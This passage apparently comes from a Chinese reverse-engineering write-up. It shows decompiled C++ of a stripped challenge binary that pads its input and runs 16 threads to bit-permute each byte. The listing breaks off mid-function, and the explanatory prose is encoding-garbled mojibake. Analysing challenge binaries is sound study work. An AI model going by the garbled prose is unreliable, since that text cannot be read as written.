*v32; <span class="comment">// r13</span></span><br><span class="line">  __int64 (__fastcall *v33)(); <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v34; <span class="comment">// al</span></span><br><span class="line">  __int64 (__fastcall *v36)(); <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v37; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v38; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v39; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v40; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v41; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *v42; <span class="comment">// r14</span></span><br><span class="line">  <span class="built_in">std</span>::thread *v43; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> *v44; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">char</span> *v45; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">char</span> *v46; <span class="comment">// r10</span></span><br><span class="line">  __m128i v47; <span class="comment">// xmm5</span></span><br><span class="line">  _BYTE *v48; <span class="comment">// rax</span></span><br><span class="line">  __m128i v49; <span class="comment">// [rsp+0h] [rbp-188h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> padding; <span class="comment">// [rsp+18h] [rbp-170h]</span></span><br><span class="line">  <span class="type">void</span> *src; <span class="comment">// [rsp+20h] [rbp-168h]</span></span><br><span class="line">  <span class="built_in">std</span>::thread *v52; <span class="comment">// [rsp+28h] [rbp-160h]</span></span><br><span class="line">  __int64 lenth; <span class="comment">// [rsp+30h] [rbp-158h]</span></span><br><span class="line">  __int64 *v54; <span class="comment">// [rsp+38h] [rbp-150h]</span></span><br><span class="line">  <span class="type">char</span> *v55; <span class="comment">// [rsp+40h] [rbp-148h]</span></span><br><span class="line">  <span class="type">char</span> *v56; <span class="comment">// [rsp+48h] [rbp-140h]</span></span><br><span class="line">  __int64 v57; <span class="comment">// [rsp+50h] [rbp-138h] BYREF</span></span><br><span class="line">  __int64 v58; <span class="comment">// [rsp+58h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *hex_vec[<span class="number">2</span>]; <span class="comment">// [rsp+60h] [rbp-128h] BYREF</span></span><br><span class="line">  _BYTE *v60; <span class="comment">// [rsp+70h] [rbp-118h]</span></span><br><span class="line">  __int64 v61; <span class="comment">// [rsp+80h] [rbp-108h] BYREF</span></span><br><span class="line">  _QWORD *v62; <span class="comment">// [rsp+88h] [rbp-100h]</span></span><br><span class="line">  __int64 v63; <span class="comment">// [rsp+90h] [rbp-F8h]</span></span><br><span class="line">  __int64 v64; <span class="comment">// [rsp+98h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">void</span> *input[<span class="number">2</span>]; <span class="comment">// [rsp+A0h] [rbp-E8h] BYREF</span></span><br><span class="line">  __int64 v66[<span class="number">2</span>]; <span class="comment">// [rsp+B0h] [rbp-D8h] BYREF</span></span><br><span class="line">  __int64 v67[<span class="number">25</span>]; <span class="comment">// [rsp+C0h] [rbp-C8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v67[<span class="number">17</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  input[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v54 = v66;</span><br><span class="line">  input[<span class="number">0</span>] = v66;</span><br><span class="line">  LOBYTE(v66[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  v3 = *(<span class="built_in">std</span>::<span class="built_in">cin</span>[<span class="number">0</span>] - <span class="number">24</span>);</span><br><span class="line">  v4 = *(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>[<span class="number">30</span>] + v3);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="built_in">std</span>::__throw_bad_cast();</span><br><span class="line">  <span class="keyword">if</span> ( v4[<span class="number">56</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v4[<span class="number">67</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::ctype&lt;<span class="type">char</span>&gt;::_M_widen_init(*(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>[<span class="number">30</span>] + v3), a2, a3);</span><br><span class="line">    v5 = <span class="number">10LL</span>;</span><br><span class="line">    v36 = *(*v4 + <span class="number">48LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v36 != <span class="built_in">std</span>::ctype&lt;<span class="type">char</span>&gt;::do_widen )</span><br><span class="line">      v5 = (v36)(v4, <span class="number">10LL</span>, <span class="number">10LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::getline&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, input, v5);</span><br><span class="line">  to_vec(hex_vec, input);</span><br><span class="line">  lenth = (LOBYTE(hex_vec[<span class="number">1</span>]) - LOBYTE(hex_vec[<span class="number">0</span>])) &amp; <span class="number">0xF</span>;</span><br><span class="line">  padding = <span class="number">16</span> - lenth;</span><br><span class="line">  v6 = operator new(<span class="number">16</span> - lenth);</span><br><span class="line">  src = v6;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="number">16</span> - lenth) &lt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="number">16</span> - lenth) &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *v6 = <span class="number">0</span>;</span><br><span class="line">      *(v6 + padding - <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v34 = padding;</span><br><span class="line">      <span class="keyword">if</span> ( padding )</span><br><span class="line">      &#123;</span><br><span class="line">        *src = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (v34 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">          *(src + padding - <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    index = src;</span><br><span class="line">    *src = <span class="number">0LL</span>;</span><br><span class="line">    v8 = padding;</span><br><span class="line">    *&amp;index[padding - <span class="number">8</span>] = <span class="number">0LL</span>;</span><br><span class="line">    v9 = index;</span><br><span class="line">    v10 = (index + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">    v11 = (v8 + v9 - v10) &amp; <span class="number">0xFFFFFFF8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v11 &gt;= <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = v11 &amp; <span class="number">0xFFFFFFF8</span>;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v14 = v13;</span><br><span class="line">        v13 += <span class="number">8</span>;</span><br><span class="line">        *(v10 + v14) = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v13 &lt; v12 );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = v60;</span><br><span class="line">  end = hex_vec[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( padding &gt; v60 - hex_vec[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v37 = hex_vec[<span class="number">1</span>] - hex_vec[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( padding &gt; <span class="number">0x7FFFFFFFFFFFFFFF</span>LL - (hex_vec[<span class="number">1</span>] - hex_vec[<span class="number">0</span>]) )</span><br><span class="line">      <span class="built_in">std</span>::__throw_length_error(<span class="string">&quot;vector::_M_range_insert&quot;</span>);</span><br><span class="line">    v38 = padding;</span><br><span class="line">    <span class="keyword">if</span> ( padding &lt; v37 )</span><br><span class="line">      v38 = hex_vec[<span class="number">1</span>] - hex_vec[<span class="number">0</span>];</span><br><span class="line">    v39 = __CFADD__(v38, v37);</span><br><span class="line">    v40 = v38 + v37;</span><br><span class="line">    v41 = v40;</span><br><span class="line">    <span class="keyword">if</span> ( v39 )</span><br><span class="line">    &#123;</span><br><span class="line">      v41 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v42 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v40 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_63;</span><br><span class="line">      <span class="keyword">if</span> ( v40 &gt; <span class="number">0x7FFFFFFFFFFFFFFF</span>LL )</span><br><span class="line">        v41 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v48 = operator new(v41);</span><br><span class="line">    v15 = v60;</span><br><span class="line">    v42 = v48;</span><br><span class="line">LABEL_63:</span><br><span class="line">    v43 = hex_vec[<span class="number">0</span>];</span><br><span class="line">    v44 = &amp;v42[end - hex_vec[<span class="number">0</span>]];</span><br><span class="line">    v45 = (hex_vec[<span class="number">1</span>] - end);</span><br><span class="line">    v46 = &amp;v44[padding];</span><br><span class="line">    v49 = _mm_unpacklo_epi64(v42, (hex_vec[<span class="number">1</span>] + v42 - hex_vec[<span class="number">0</span>] + padding));</span><br><span class="line">    <span class="keyword">if</span> ( end == hex_vec[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      qmemcpy(v44, src, padding);</span><br><span class="line">      <span class="keyword">if</span> ( !v45 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_65;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v56 = &amp;v44[padding];</span><br><span class="line">      v52 = hex_vec[<span class="number">0</span>];</span><br><span class="line">      v55 = &amp;v42[end - hex_vec[<span class="number">0</span>]];</span><br><span class="line">      memmove(v42, hex_vec[<span class="number">0</span>], end - hex_vec[<span class="number">0</span>]);</span><br><span class="line">      v43 = v52;</span><br><span class="line">      qmemcpy(v55, src, padding);</span><br><span class="line">      v46 = v56;</span><br><span class="line">      <span class="keyword">if</span> ( !v45 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_70;</span><br><span class="line">    &#125;</span><br><span class="line">    v52 = v43;</span><br><span class="line">    memmove(v46, end, v45);</span><br><span class="line">    v43 = v52;</span><br><span class="line">LABEL_65:</span><br><span class="line">    <span class="keyword">if</span> ( !v43 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_66:</span><br><span class="line">      v47 = _mm_load_si128(&amp;v49);</span><br><span class="line">      v60 = &amp;v42[v41];</span><br><span class="line">      *hex_vec = v47;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_70:</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(v43, v15 - v43)</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_66;</span><br><span class="line">  &#125;</span><br><span class="line">  memmove(hex_vec[<span class="number">1</span>], src, padding);</span><br><span class="line">  hex_vec[<span class="number">1</span>] = hex_vec[<span class="number">1</span>] + padding;</span><br><span class="line">LABEL_10:</span><br><span class="line">  v52 = v67;</span><br><span class="line">  <span class="built_in">memset</span>(v67, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  v61 = <span class="number">16LL</span>;</span><br><span class="line">  v62 = <span class="number">0LL</span>;</span><br><span class="line">  v63 = <span class="number">0LL</span>;</span><br><span class="line">  v64 = <span class="number">0LL</span>;</span><br><span class="line">  v17 = operator new[](<span class="number">512LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  *v17 = <span class="number">0LL</span>;</span><br><span class="line">  v17[<span class="number">63</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(((v17 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL), <span class="number">0</span>, <span class="number">8LL</span> * ((v17 - ((v17 + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFF8</span>) + <span class="number">512</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">  v18 = v62;</span><br><span class="line">  v62 = v17;</span><br><span class="line">  <span class="keyword">if</span> ( v18 )</span><br><span class="line">    operator delete[](v18, <span class="number">64LL</span>);</span><br><span class="line">  v19 = v52;</span><br><span class="line">  id = <span class="number">1</span>;</span><br><span class="line">  v21 = v52;</span><br><span class="line">  v49 = _mm_unpacklo_epi64(hex_vec, &amp;v61);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v57 = <span class="number">0LL</span>;</span><br><span class="line">    arg = operator new(<span class="number">0x28</span>uLL);</span><br><span class="line">    v23 = _mm_load_si128(&amp;v49);</span><br><span class="line">    *arg = &amp;off_556C970A5C80;</span><br><span class="line">    *(arg + <span class="number">8</span>) = id;</span><br><span class="line">    *(arg + <span class="number">32</span>) = binswap;</span><br><span class="line">    *(arg + <span class="number">16</span>) = v23;</span><br><span class="line">    v58 = arg;</span><br><span class="line">    <span class="built_in">std</span>::thread::_M_start_thread(&amp;v57, &amp;v58, &amp;pthread_create);</span><br><span class="line">    <span class="keyword">if</span> ( v58 )</span><br><span class="line">      (*(*v58 + <span class="number">8LL</span>))(v58);</span><br><span class="line">    v24 = *v19;</span><br><span class="line">    <span class="keyword">if</span> ( *v19 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_73;</span><br><span class="line">    ++id;</span><br><span class="line">    v19 = (v19 + <span class="number">8</span>);</span><br><span class="line">    *(v19 - <span class="number">1</span>) = v57;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( id != <span class="number">17</span> );</span><br><span class="line">  v25 = (v52 + <span class="number">128</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::thread::join(v21);</span><br><span class="line">    v21 = (v21 + <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v25 != v21 );</span><br><span class="line">  v26 = <span class="string">&quot;%ld\n\n&quot;</span>;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%ld\n\n&quot;</span>, hex_vec[<span class="number">1</span>] - hex_vec[<span class="number">0</span>]);</span><br><span class="line">  reslut = hex_vec[<span class="number">0</span>];</span><br><span class="line">  v28 = lenth - <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( lenth - <span class="number">16</span> + hex_vec[<span class="number">1</span>] - hex_vec[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v29 = <span class="built_in">std</span>::<span class="built_in">cout</span>[<span class="number">0</span>];</span><br><span class="line">      v30 = <span class="built_in">std</span>::<span class="built_in">cout</span> + *(<span class="built_in">std</span>::<span class="built_in">cout</span>[<span class="number">0</span>] - <span class="number">24LL</span>);</span><br><span class="line">      v31 = v30[<span class="number">225</span>] == <span class="number">0</span>;</span><br><span class="line">      *(v30 + <span class="number">6</span>) = *(v30 + <span class="number">6</span>) &amp; <span class="number">0xFFFFFFB5</span> | <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v31 )</span><br><span class="line">      &#123;</span><br><span class="line">        v32 = *(v30 + <span class="number">30</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v32 )</span><br><span class="line">          <span class="built_in">std</span>::__throw_bad_cast();</span><br><span class="line">        <span class="keyword">if</span> ( !v32[<span class="number">56</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">std</span>::ctype&lt;<span class="type">char</span>&gt;::_M_widen_init(*(v30 + <span class="number">30</span>), v26, reslut);</span><br><span class="line">          v33 = *(*v32 + <span class="number">48LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v33 != <span class="built_in">std</span>::ctype&lt;<span class="type">char</span>&gt;::do_widen )</span><br><span class="line">            (v33)(v32, <span class="number">32LL</span>);</span><br><span class="line">          v29 = <span class="built_in">std</span>::<span class="built_in">cout</span>[<span class="number">0</span>];</span><br><span class="line">          reslut = hex_vec[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        v30[<span class="number">225</span>] = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v30[<span class="number">224</span>] = <span class="number">48</span>;</span><br><span class="line">      *(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>[<span class="number">2</span>] + *(v29 - <span class="number">24</span>)) = <span class="number">2LL</span>;</span><br><span class="line">      v26 = v24[reslut];</span><br><span class="line">      <span class="built_in">std</span>::ostream::operator&lt;&lt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, v26);</span><br><span class="line">      reslut = hex_vec[<span class="number">0</span>];</span><br><span class="line">      ++v24;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( (v28 + hex_vec[<span class="number">1</span>] - hex_vec[<span class="number">0</span>]) &gt; v24 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v62 )</span><br><span class="line">    operator delete[](v62, <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v67[<span class="number">15</span>]</span><br><span class="line">    || v67[<span class="number">14</span>]</span><br><span class="line">    || v67[<span class="number">13</span>]</span><br><span class="line">    || v67[<span class="number">12</span>]</span><br><span class="line">    || v67[<span class="number">11</span>]</span><br><span class="line">    || v67[<span class="number">10</span>]</span><br><span class="line">    || v67[<span class="number">9</span>]</span><br><span class="line">    || v67[<span class="number">8</span>]</span><br><span class="line">    || v67[<span class="number">7</span>]</span><br><span class="line">    || v67[<span class="number">6</span>]</span><br><span class="line">    || v67[<span class="number">5</span>]</span><br><span class="line">    || v67[<span class="number">4</span>]</span><br><span class="line">    || v67[<span class="number">3</span>]</span><br><span class="line">    || v67[<span class="number">2</span>]</span><br><span class="line">    || v67[<span class="number">1</span>]</span><br><span class="line">    || v67[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_73:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">terminate</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  operator <span class="title function_">delete</span><span class="params">(src, padding)</span>;</span><br><span class="line">  <span class="keyword">if</span> ( hex_vec[<span class="number">0</span>] )</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(hex_vec[<span class="number">0</span>], v60 - hex_vec[<span class="number">0</span>])</span>;</span><br><span class="line">  <span class="keyword">if</span> ( input[<span class="number">0</span>] != v54 )</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(input[<span class="number">0</span>], v66[<span class="number">0</span>] + <span class="number">1</span>)</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹æ— ç¬¦å·çš„C++ç¨‹åºé™æ€åˆ†æçš„æ•ˆæœæ¯”åŠ¨æ€åˆ†æçš„æ•ˆç‡å·®å¾ˆå¤š å¦‚æœæ²¡æœ‰å¾ˆå¼ºçš„åè°ƒè¯•æªæ–½å°½é‡é€šè¿‡åŠ¨è°ƒæ¥è·å–æŸä¸ªæ–¹æ³•&#x2F;å‡½æ•°çš„ä½œç”¨ å¯¹äºåè°ƒè¯•æªæ–½å¼ºçš„ç¨‹åºå¯ä»¥é€šè¿‡æ–¹æ³•&#x2F;ç¨‹åºä¸­çš„æŠ¥é”™ä¿¡æ¯æ¥è¯†åˆ«å†…ç½®æ–¹æ³•&#x2F;å‡½æ•°</p>
<p>å…¶ä¸­å¼€å¯çº¿ç¨‹è¿›è¡ŒåŠ å¯†çš„ä¸»è¦é€»è¾‘:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v49 = _mm_unpacklo_epi64(hex_vec, &amp;v61);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v57 = <span class="number">0LL</span>;</span><br><span class="line">  arg = operator new(<span class="number">0x28</span>uLL);</span><br><span class="line">  v23 = _mm_load_si128(&amp;v49);</span><br><span class="line">  *arg = &amp;off_556C970A5C80;</span><br><span class="line">  *(arg + <span class="number">8</span>) = id;</span><br><span class="line">  *(arg + <span class="number">32</span>) = binswap;</span><br><span class="line">  *(arg + <span class="number">16</span>) = v23;</span><br><span class="line">  v58 = arg;</span><br><span class="line">  <span class="built_in">std</span>::thread::_M_start_thread(&amp;v57, &amp;v58, &amp;pthread_create);</span><br><span class="line">  <span class="keyword">if</span> ( v58 )</span><br><span class="line">    (*(*v58 + <span class="number">8LL</span>))(v58);</span><br><span class="line">  v24 = *v19;</span><br><span class="line">  <span class="keyword">if</span> ( *v19 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_73;</span><br><span class="line">  ++id;</span><br><span class="line">  v19 = (v19 + <span class="number">8</span>);</span><br><span class="line">  *(v19 - <span class="number">1</span>) = v57;</span><br><span class="line">&#125;<span class="keyword">while</span> ( id != <span class="number">17</span> );</span><br></pre></td></tr></table></figure>

<p>è¦å¯åŠ¨çš„çº¿ç¨‹å‡½æ•°, çº¿ç¨‹å‡½æ•°çš„å‚æ•°é€šè¿‡<code>arg</code>ä¼ å…¥ çº¿ç¨‹å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">binswap</span><span class="params">(_QWORD *a1, __int64 *data_to_encrypt, <span class="type">unsigned</span> __int8 id)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 piece; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">signed</span> __int8 *v5; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *v6; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">char</span> *nowpiece; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> trans; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int8 v12; <span class="comment">// bl</span></span><br><span class="line">  __int64 v13; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">signed</span> __int8 v14; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">signed</span> __int8 v15; <span class="comment">// r8</span></span><br><span class="line">  __int64 v16; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v18; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v19; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v20; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">signed</span> __int8 *v21; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">signed</span> __int8 v22; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">unsigned</span> __int32 v23; <span class="comment">// r14d</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v24; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v25; <span class="comment">// r12d</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">bool</span> v27; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">signed</span> __int8 v28; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">signed</span> __int8 *v29; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">signed</span> __int8 v30; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *v32; <span class="comment">// [rsp+8h] [rbp-80h]</span></span><br><span class="line">  <span class="type">pthread_t</span> v34; <span class="comment">// [rsp+18h] [rbp-70h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> threadid; <span class="comment">// [rsp+28h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [rsp+2Ch] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 base; <span class="comment">// [rsp+38h] [rbp-50h]</span></span><br><span class="line">  __int64 v38[<span class="number">9</span>]; <span class="comment">// [rsp+40h] [rbp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  piece = *data_to_encrypt;                     <span class="comment">// data in vector</span></span><br><span class="line">  v38[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( piece != data_to_encrypt[<span class="number">1</span>] )            <span class="comment">// to end</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = a1 + <span class="number">25</span>;</span><br><span class="line">    base = <span class="number">0LL</span>;</span><br><span class="line">    v34 = pthread_self();</span><br><span class="line">    v32 = (&amp;unk_556C970A6280 + ((<span class="number">32</span> * (a1 + <span class="number">25</span>)) &amp; <span class="number">0x780</span>));</span><br><span class="line">    v6 = v32 + <span class="number">16</span>;</span><br><span class="line">    threadid = id;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      index = threadid;</span><br><span class="line">      v36 = <span class="number">16</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        nowpiece = (piece + (index + base));</span><br><span class="line">        v9 = *nowpiece;</span><br><span class="line">        trans = *nowpiece &amp; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (*nowpiece &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">          trans = <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>)] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v9 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">1</span>] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v9 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">2</span>] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v9 &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">3</span>] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v9 &amp; <span class="number">0x10</span>) != <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">4</span>] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v9 &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">5</span>] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v9 &amp; <span class="number">0x40</span>) != <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">6</span>] - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v9 &lt; <span class="number">0</span> )</span><br><span class="line">          trans |= <span class="number">1</span> &lt;&lt; (table[<span class="number">8</span> * (threadid - <span class="number">1</span>) + <span class="number">7</span>] - <span class="number">1</span>);</span><br><span class="line">        *nowpiece = trans;</span><br><span class="line">        v38[<span class="number">0</span>] = v34;</span><br><span class="line">        v11 = <span class="built_in">std</span>::_Hash_bytes(v38, <span class="number">8uLL</span>, <span class="number">0xC70F6907</span>uLL);</span><br><span class="line">        v12 = *v5;</span><br><span class="line">        v13 = *a1;</span><br><span class="line">        v14 = *v5 + <span class="number">1</span>;</span><br><span class="line">        v15 = *v5 + <span class="number">2</span>;</span><br><span class="line">        v16 = *a1 + <span class="number">1LL</span>;</span><br><span class="line">        v17 = v11 % (v16 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( *a1 &gt; <span class="number">1uLL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v18 = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v19 = v16 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (v13 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span 